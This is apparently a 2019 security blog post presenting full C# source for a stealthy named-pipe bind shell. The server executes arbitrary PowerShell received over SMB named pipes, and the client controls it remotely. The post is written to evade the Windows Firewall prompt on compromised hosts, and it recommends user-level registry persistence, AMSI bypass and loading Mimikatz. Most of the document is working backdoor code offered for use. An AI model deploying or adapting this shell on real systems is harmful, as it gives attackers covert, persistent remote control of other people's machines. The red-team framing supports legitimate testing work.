---
layout: post
title:  "User-level bind shell bypassing host-firewall restrictions"
date:   2019-09-13 14:14:00 -0300
categories: research
---

# Introduction

This article will depict a technique that could be used by a penetration tester to stealthly get a remote powershell shell on a target that was previously compromised.

Stealthly because of two reasons:

1. It does not trigger Windows Firewall upon binding a new TCP socket because it doesn't bind any socket at all!
2. It uses named pipe as data transport, so not so much abnormality of traffic will be generated from this.


# Windows Firewall Behaviour Analysis

In windows, when trying to bind a TCP socket, the Windows Firewall will ask permission to the user to continue, usually during the bind() call.

Not only that, you also need to be a local administrator to add such rule into the allowed rules. If our user that executed the payload isn't Local Administrator or refuse to allow it, then our attack is doomed!

![Screenshot](/assets/BindShell-01.png)

That can't happen at all. So, if reverse shell isn't an option either, how to bypass such restriction?

That's an easy question: Let's use something which is already allowed. SMB Inbound is usually allowed by default, so if there is any functionality that can be used to communicate to external parties then it can be used to establish a command-and-control mechanism with us (attackers).

That's where Named Pipes come in!

# Named Pipes

As in MSDN website, named pipes are __"one-way or duplex pipe for communication between the pipe server and one or more pipe clients"__. That fits exactly to our purpose.

By default, there is no way to control a computer using named pipes, but we have many Windows API calls to aid us in this purpose like CreateNamedPipe, ConnectNamedPipe and so on.


# Coding a named pipe bind shell with PowerShell execution capabilities

I have stumbled on a very useful repository owned by Tim MalcomVetter. If you still doesn't follow him on twitter then it is the time! Very useful red teaming tips over there.

He created a repository named "NamedPipes" which does all the hard work. It starts a named pipe for communication and then execute commands in the named pipe server.

With that stated, this code published here is just a adaptation of his original work. I haven't coded this from the beggining because I am very lazy and Tim has done all the hard work already, so... why reinvent the wheel?

To keep originality I chose to switch from executing commands using cmd.exe and to use a PowerShell runspace, because a PowerShell shell is way more useful for me than a default command prompt. 

To build our C2 using named pipes we will need mainly two entitites: A server (our compromised host) and a client (us, the attacker).

The server code:
```C#
using System;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.IO;
using System.IO.Pipes;
using System.Text;

namespace Server
{
    class Server
    {
        static void Main(string[] args)
        {

            Runspace runspace = null;
             // Create a PS runspace.
            try
            {
                runspace = RunspaceFactory.CreateRunspace();
                runspace.ApartmentState = System.Threading.ApartmentState.STA; 
                runspace.Open();
            } catch
            {
                Console.WriteLine("[!] Error: Could not create a PS runspace.");
                Environment.Exit(1);
            }

           while(true)
            {
                using (var pipe = new NamedPipeServerStream(
                "namedpipeshell",
                PipeDirection.InOut,
                NamedPipeServerStream.MaxAllowedServerInstances,
                PipeTransmissionMode.Message))
                {
                    Console.WriteLine("[*] Waiting for client connection...");
                    pipe.WaitForConnection();
                    Console.WriteLine("[*] Client connected.");
                    while (true)
                    {
                        var messageBytes = ReadMessage(pipe);
                        var line = Encoding.UTF8.GetString(messageBytes);
                        Console.WriteLine("[*] Received: {0}", line);
                        if (line.ToLower() == "exit")
                        {
                            return;
                        }

                        // Execute PowerShell code.
                        try
                        {

                            Pipeline PsPipe = runspace.CreatePipeline();
                            PsPipe.Commands.AddScript(line);
                            PsPipe.Commands.Add("Out-String");
                            Collection<PSObject> results = PsPipe.Invoke();
                            StringBuilder stringBuilder = new StringBuilder();
                            foreach (PSObject obj in results)
                            {
                                stringBuilder.AppendLine(obj.ToString());
                            }

                            var response = Encoding.ASCII.GetBytes(stringBuilder.ToString());

                            try
                            {
                                pipe.Write(response, 0, response.Length);
                            }
                            catch
                            {
                                Console.WriteLine("[!] Pipe is broken!");
                                break;
                            }

                        }
                        catch (Exception e)
                        {
                            var response = Encoding.ASCII.GetBytes("ERROR: " + e.Message);
                            pipe.Write(response, 0, response.Length);
                        }
                    }
                }
            }
        }

        private static byte[] ReadMessage(PipeStream pipe)
        {
            byte[] buffer = new byte[1024];
            using (var ms = new MemoryStream())
            {
                do
                {
                    var readBytes = pipe.Read(buffer, 0, buffer.Length);
                    ms.Write(buffer, 0, readBytes);
                }
                while (!pipe.IsMessageComplete);

                return ms.ToArray();
            }
        }
    }
}


```



And the client code:

```C#
using System;
using System.IO;
using System.IO.Pipes;
using System.Text;

namespace Client
{
    class Client
    {
        static void Main(string[] args)
        {

            if(args.Length == 0)
            {
                Console.WriteLine("Usage: " + AppDomain.CurrentDomain.FriendlyName + " <IP/hostname>");
                Environment.Exit(0);
            }

            Console.WriteLine("[+] Connecting to " + args[0]);
            using (var pipe = new NamedPipeClientStream(args[0], "namedpipeshell", PipeDirection.InOut))
            {
                pipe.Connect(5000);
                pipe.ReadMode = PipeTransmissionMode.Message;
                Console.WriteLine("[+] Connection established succesfully.");
                do
                {
                    Console.Write("PS> ");
                    var input = Console.ReadLine();
                    if (String.IsNullOrEmpty(input)) continue;
                    byte[] bytes = Encoding.Default.GetBytes(input);
                    pipe.Write(bytes, 0, bytes.Length);
                    if (input.ToLower() == "exit") return;
                    var result = ReadMessage(pipe);
                    Console.WriteLine(Encoding.UTF8.GetString(result));
                    Console.WriteLine();
                } while (true);
            }
        }

        private static byte[] ReadMessage(PipeStream pipe)
        {
            byte[] buffer = new byte[1024];
            using (var ms = new MemoryStream())
            {
                do
                {
                    var readBytes = pipe.Read(buffer, 0, buffer.Length);
                    ms.Write(buffer, 0, readBytes);
                }
                while (!pipe.IsMessageComplete);

                return ms.ToArray();
            }
        }
    }
}
```

Don't bother copying and pasting to Visual Studio, in the end of this article I will give a link to my Github Repository containing the Visual Studio solution.


The scenario is, after compromising a host but dont have a good way to get a remote shell and can't rely on allowing firewall rules (may lack privileges to that), you can drop a Server.exe inside the machine disk and use any persistence method (even user-level, like HKCU registry techniques) to spawn it when user logs in, this way, you will have access to the machine just by connecting to it using the Client.exe!!

# Results

You can find the final code [here](https://github.com/0x00-0x00/NamedPipes) in my Github.

Compile both projects and test it yourself!

Executing the Server.exe __DOES NOT__ triggers firewall pop-up because it will use SMB port which is allowed by default :)

![Screenshot](/assets/BindShell-03.png)

And in our attacker machine, we can control it remotely __AND have powershell__!

![Screenshot](/assets/BindShell-02.png)

Of course, from this onwards you could implement automatic AMSI bypass or even automatically loading offensive scripts like PowerView, Invoke-Mimikatz and so much more fun!


Best regards,

zc00l


# References

https://twitter.com/malcomvetter

https://github.com/malcomvetter/NamedPipes

https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes

https://decoder.cloud/2017/11/02/we-dont-need-powershell-exe/

